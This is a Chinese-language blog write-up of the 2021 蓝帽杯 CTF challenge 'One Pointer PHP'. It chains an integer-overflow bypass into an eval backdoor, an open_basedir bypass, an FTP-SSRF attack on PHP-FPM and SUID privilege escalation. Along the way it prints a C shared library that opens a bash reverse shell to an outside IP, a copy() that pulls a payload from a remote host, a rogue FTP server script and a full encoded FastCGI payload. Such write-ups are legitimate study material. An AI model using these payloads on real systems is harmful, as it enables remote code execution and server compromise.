---
title: '[蓝帽杯 2021]One Pointer PHP'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-05-06 14:46:02
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143425.jpg
---
这题没做出来需要反思
给了源码

## 第一层
user.php

    <?php
    class User{
	    public $count;
    }
    ?>

add_api.php

    <?php
    include "user.php";
    if($user=unserialize($_COOKIE["data"])){
    	$count[++$user->count]=1;
	    if($count[]=1){
	    	$user->count+=1;
	    	setcookie("data",serialize($user));
	    }else{
	    	eval($_GET["backdoor"]);
	    }
    }else{
    	$user=new User;
	    $user->count=1;
	    setcookie("data",serialize($user));
    }
    ?>

另$a->count等于php long long类型最大值-1即可绕过(转化为float报错)
本地测试如下：

没过：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204027.png)

过了：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204051.png)

过了之后就可以执行命令，查看phpinfo：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204141.png)

ban了一大堆函数，print_r(scandir(./))看下目录：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430204226.png)

查看根目录失败，看到openbase_dir有限制，想起来[NCTF2019]phar matches everything里中bypass open_basedir的姿势：https://xz.aliyun.com/t/4720

    <?php 
    mkdir('troy3e');
    chdir('troy3e');
    ini_set('open_basedir','..');
    chdir('..');chdir('..');
    chdir('..');chdir('..');
    chdir('..');chdir('..');chdir('..');
    ini_set('open_basedir','/');
    var_dump(file_get_contents("/usr/local/etc/php/php.ini"));
    ?>

没法读flag，估计是权限不够，但是可以读php.ini。
预期解是pwn这个：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430210255.png)

然后就不会了。。。
不过现在想想还是大意了，因为这非预期前阵子刚学习过，还就是上面NCTF那道题里面的。。。此处不得不佩服ha1师傅：https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/

回到phpinfo

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210430210613.png)

查看nginx配置文件：readfile('/etc/nginx/sites-enabled/default');

发现fpm开在9001端口。

## FTP - SSRF 攻击 FPM/FastCGI
如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。
如果我们传入
?file=ftp://evil-server/file.txt&data=payload
，会发生以下情况：

首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。

这里通过加载恶意so的方式来RCE。

写一个扩展：

    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    __attribute__ ((__constructor__)) void preload (void){
        system("bash -c 'bash -i >& /dev/tcp/121.x.x.x/3333 0>&1'");
    }

编译：

    gcc hpdoger.c -fPIC -shared -o hpdoger.so

将生成的 hpdoger.so 上传到目标主机的 /tmp 目录中，之前复现就卡在这一步，直接用的copy属实是hanpi了(参考http://www.hackdig.com/05/hack-342091.htm)：

    /add_api.php?backdoor=mkdir('troy3e');chdir('troy3e');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');copy('http://121.196.169.53:5554/hpdoger.so)

然后再自己vps上使用以下脚本搭建一个恶意的ftp服务器：

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(('0.0.0.0', 2000))
    s.listen(1)
    conn, addr = s.accept()
    conn.send(b'220 welcome\n')
    #Service ready for new user.
    #Client send anonymous username
    #USER anonymous
    conn.send(b'331 Please specify the password.\n')
    #User name okay, need password.
    #Client send anonymous password.
    #PASS anonymous
    conn.send(b'230 Login successful.\n')
    #User logged in, proceed. Logged out if appropriate.
    #TYPE I
    conn.send(b'200 Switching to Binary mode.\n')
    #Size /
    conn.send(b'550 Could not get the file size.\n')
    #EPSV (1)
    conn.send(b'150 ok\n')
    #PASV
    conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
    conn.send(b'150 Permission denied.\n')
    #QUIT
    conn.send(b'221 Goodbye.\n')
    conn.close()

同时监听3333端口。
生成攻击 php-fpm 所需要的脚本：

见http://www.hackdig.com/05/hack-342091.htm
太长了就不放了

payload：

    567bb380-8360-4aeb-b93c-cddea7970584.node3.buuoj.cn/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://121.x.x.x:2000&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00

但此时权限还是不够，无法读取flag：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210506143236.png)

## SUID 提权

UID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。

已知的可用来提权的linux可行性的文件列表如下：

    nmap
    vim
    find
    bash
    more
    less
    nano
    cp

以下命令可以发现系统上运行的所有SUID可执行文件。

    #以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000-print2>/dev/null
    find / -user root -perm -4000-exec ls -ldb {} \;

在本题php就有suid，直接进入交互模式执行代码，得到flag：

    chdir('troy3e');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210506144929.png)

参考链接：
https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/
https://www.anquanke.com/post/id/186186
http://www.hackdig.com/05/hack-342091.htm